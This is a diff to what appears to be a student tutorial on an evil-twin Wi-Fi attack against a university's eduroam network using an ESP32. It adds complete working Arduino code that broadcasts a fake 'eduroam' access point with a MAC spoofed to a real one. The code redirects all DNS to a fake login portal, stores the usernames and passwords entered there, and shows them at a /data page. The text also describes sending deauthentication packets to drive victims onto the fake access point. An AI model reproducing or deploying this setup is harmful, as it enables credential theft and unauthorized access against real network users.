@@ -184,7 +184,7 @@ void loop() {
 ```
 
 ## STEP 4: Modifying The Code
-Now that we have a working code it is time to analyze it and modify certain aspects that will make the attack more successful. As you can see our code provides a basic html login page that isn't very convincing so we will fix that.
+Now that we have a working code it is time to analyze it and modify certain aspects that will make the attack more successful. As you can see our code provides a basic html login page that isn't very convincing, so we will fix that.
 
 Since we are quite happy with the look of the webpage, we will keep the html code, but we need to add the UniTS logo which will make everything nicer. To do that we need to use SPIFFS (Serial Peripheral Interface Flash File System) to upload the files to the microcontroller mamory which will then be available for the code to access when needed.
 
@@ -218,8 +218,8 @@ To do so we need to install Arduino 1.8.19 IDE and download the Arduino ESP32 fi
 
 ![Before/After ssid](images/ssid.jpg)
   
-## STEP 6: Adding features
-+ Now that we have a fully working rogue AP we can add the ability for the ESP32 to spoof it's MAC address to the MAC address of a real AP in the university. This MAC address can be easily found by using a tool like WifiInfoView by Nirsoft. Spoofing the MAC address that is known to the network enhances the stealth and credibility of the evil twin attack, making it possibly more effective. We do this by adding:
+## STEP 6: MAC spoofing
+Now that we have a fully working rogue AP we can add the ability for the ESP32 to spoof it's MAC address to the MAC address of a real AP in the university. This MAC address can be easily found by using a tool like WifiInfoView by Nirsoft. Spoofing the MAC address that is known to the network enhances the stealth and credibility of the evil twin attack, making it possibly more effective. We do this by adding:
 
 ```cpp
   uint8_t customMAC[] = { 0x9C, 0x8C, 0xD8, 0xC9, 0xCA, 0x50 }; // Replace with target MAC
@@ -239,6 +239,135 @@ WiFi.softAP(ssid);
 To aid the process of users connecting to our "evil" AP we will try to send deauthentification packets to disconnect the victim from the real acess point thus increasing the probability of getting a victim to acess our "evil" AP. 
 As can be easily discovered eduraom uses WPA3 - Enterprise which is a problem since it strictly requires PMF (Protected Management Frames) which we cannot forge as we cannot sign them. But we also know that sometimes eduraom falls back onto older standards like WPA2 - Enterprise for supporting older devices. Since in WPA2 - Enterprise PMF are optional but probably turned on. None the less we can use the tool at ```https://deauther.com``` and an ESP8266 to send deauthentication packets and hopefully boost our success rate. 
 
+
+## Full code:
+Below is the full code. For it to work the arduino project folder (where the .ino file is placed) needs to contain a data folder with the following files: +index.html
++logo.png
++LogoPolicy.png
++policy.html
+ 
+```cpp
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <SPIFFS.h>
+
+extern "C" {
+  #include "esp_wifi.h"
+}
+
+// === Network Configuration ===
+const char* ssid = "eduroam ";  // Evil Twin SSID
+IPAddress apIP(192, 168, 4, 1);
+IPAddress netMsk(255, 255, 255, 0);
+
+// === Server Setup ===
+DNSServer dnsServer;
+WebServer server(80);
+
+String capturedData = "";
+
+// === Credential Capture Handler ===
+void handleLogin() {
+  String user = server.arg("username");
+  String pass = server.arg("password");
+  capturedData += "Username: " + user + " | Password: " + pass + "\n";
+
+  Serial.println("[+] Captured: " + user + " | " + pass);
+  server.send(200, "text/html", "<h2>Authentication successful. You may now use eduroam.</h2>");
+}
+
+// === View Captured Data ===
+void handleData() {
+  server.send(200, "text/plain", capturedData);
+}
+
+// === Captive Portal Handler ===
+void handlePortal() {
+  // Serve index.html from SPIFFS when redirected to /portal
+  File file = SPIFFS.open("/index.html", "r");
+  if (!file) {
+    server.send(500, "text/plain", "Login page not found");
+    return;
+  }
+  server.streamFile(file, "text/html");
+  file.close();
+}
+
+// HANDLE POLICY --------------------
+void handlePolicy() {
+  // Serve policy.html from SPIFFS when redirected to /policy
+  File file = SPIFFS.open("/policy.html", "r");
+  if (!file) {
+    server.send(500, "text/plain", "Policy page not found");
+    return;
+  }
+  server.streamFile(file, "text/html");
+  file.close();
+}
+
+// === Fallback Redirect for Unknown Requests === this will redirect unknown http req's to our captive portal page
+// based on this redirect various systems could detect that WiFi AP has a captive portal page
+void handleNotFound() {
+  server.sendHeader("Location", "/portal", true);
+  server.send(302, "text/plain", "Redirecting to captive portal");
+}
+
+void setup() {
+  Serial.begin(115200);
+  delay(1000);
+
+  // === Wi-Fi AP Configuration ===
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, netMsk);
+  //Setting Spoofed MAC
+  uint8_t customMAC[] = { 0x9C, 0x8C, 0xD8, 0xC9, 0xCA, 0x50 }; // Replace with target MAC
+  esp_wifi_set_mac(WIFI_IF_AP, customMAC);
+  delay(500);
+  
+  WiFi.softAP(ssid);
+  delay(500);
+  Serial.println("[*] Access Point 'eduroam' started");
+  Serial.println(WiFi.softAPIP());
+  Serial.println(WiFi.softAPmacAddress());
+  // === SPIFFS Mount ===
+  if (!SPIFFS.begin(true)) {
+    Serial.println("SPIFFS Mount Failed!");
+    return;
+  }
+
+  // === DNS Spoof All Domains ===
+  if (dnsServer.start(53, "*", apIP)) {
+    Serial.println("[*] DNS server started in captive mode");
+  } else {
+    Serial.println("[!] Failed to start DNS server");
+  }
+
+  // === Routes ===
+  server.on("/", []() {
+    server.sendHeader("Location", "/portal", true);
+    server.send(302, "text/plain", "");
+  });
+
+  
+  server.on("/portal", handlePortal);                   // Captive portal page
+  server.on("/login", HTTP_POST, handleLogin);          // Form POST
+  server.on("/data", HTTP_GET, handleData);             // View captured credentials
+  server.on("/policy", handlePolicy);                     // Policy Page
+  server.serveStatic("/logo.png", SPIFFS, "/logo.png"); // Serve logo
+  server.serveStatic("/LogoPolicy.png", SPIFFS, "/LogoPolicy.png"); // Serve logo
+  server.onNotFound(handleNotFound);                    // Redirect everything else
+
+  server.begin();
+  Serial.println("[*] Web server started");
+}
+
+void loop() {
+  dnsServer.processNextRequest();
+  server.handleClient();
+}
+
+```
 Analyzing this 
 
 
